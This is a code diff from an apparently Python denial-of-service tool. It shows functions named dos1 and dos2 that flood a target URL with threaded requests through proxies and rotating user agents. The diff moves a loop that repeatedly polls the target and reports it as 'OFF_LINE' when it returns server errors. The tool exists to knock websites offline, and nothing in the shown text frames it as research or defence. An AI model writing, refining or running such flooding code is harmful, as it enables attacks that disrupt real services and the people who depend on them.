@@ -86,16 +86,6 @@ def dos1(target):
         except:
             pass
 
-        try:
-            checksite = requests.post(url, headers={'user-agent': useragent5}, proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
-            if checksite.status_code >= 500:
-                statustext = "OFF_LINE"
-            else:
-                statustext = "ON_LINE"
-        except:
-            pass
-        print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
-
 def dos2(target):
     while True:
         useragent = random.choice(headersp)
@@ -147,3 +137,16 @@ else:
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
+
+while True:
+    try:
+        checksite = requests.post(url, headers={'user-agent': useragent5},
+                                  proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
+        if checksite.status_code >= 500:
+            statustext = "OFF_LINE"
+        else:
+            statustext = "ON_LINE"
+    except:
+        pass
+    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
+    time.sleep(1)
